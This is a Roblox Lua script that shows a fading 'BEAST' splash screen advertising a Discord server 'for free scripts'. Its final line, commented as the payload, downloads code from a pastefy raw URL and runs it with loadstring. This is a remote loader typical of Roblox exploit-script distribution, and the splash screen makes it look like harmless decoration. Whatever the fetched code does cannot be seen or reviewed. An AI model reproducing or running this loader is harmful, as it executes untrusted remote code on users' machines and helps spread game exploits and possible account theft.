--// Beast Intro
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BeastIntro"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 70)
Title.Position = UDim2.new(0, 0, 0.35, 0)
Title.BackgroundTransparency = 1
Title.Text = "BEAST"
Title.TextColor3 = Color3.fromRGB(170, 0, 255)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = Background

local Subtitle = Instance.new("TextLabel")
Subtitle.Size = UDim2.new(1, 0, 0, 40)
Subtitle.Position = UDim2.new(0, 0, 0.48, 0)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "SERVER FOR FREE SCRIPTS"
Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
Subtitle.TextScaled = true
Subtitle.Font = Enum.Font.GothamBold
Subtitle.Parent = Background

local Discord = Instance.new("TextLabel")
Discord.Size = UDim2.new(1, 0, 0, 35)
Discord.Position = UDim2.new(0, 0, 0.58, 0)
Discord.BackgroundTransparency = 1
Discord.Text = "https://discord.gg/rS44yatgSA"
Discord.TextColor3 = Color3.fromRGB(170, 0, 255)
Discord.TextScaled = true
Discord.Font = Enum.Font.Gotham
Discord.Parent = Background

Background.BackgroundTransparency = 1
Title.TextTransparency = 1
Subtitle.TextTransparency = 1
Discord.TextTransparency = 1

local FadeIn = TweenInfo.new(1, Enum.EasingStyle.Quad)

TweenService:Create(Background, FadeIn, { BackgroundTransparency = 0 }):Play()
TweenService:Create(Title, FadeIn, { TextTransparency = 0 }):Play()
TweenService:Create(Subtitle, FadeIn, { TextTransparency = 0 }):Play()
TweenService:Create(Discord, FadeIn, { TextTransparency = 0 }):Play()

task.wait(3)

local FadeOut = TweenInfo.new(1, Enum.EasingStyle.Quad)

for _, Object in pairs(Background:GetChildren()) do
    if Object:IsA("TextLabel") then
        TweenService:Create(Object, FadeOut, { TextTransparency = 1 }):Play()
    end
end

TweenService:Create(Background, FadeOut, { BackgroundTransparency = 1 }):Play()

task.wait(1)

ScreenGui:Destroy()

--// payload
loadstring(game:HttpGet("https://pastefy.app/lxCBtrq7/raw"))()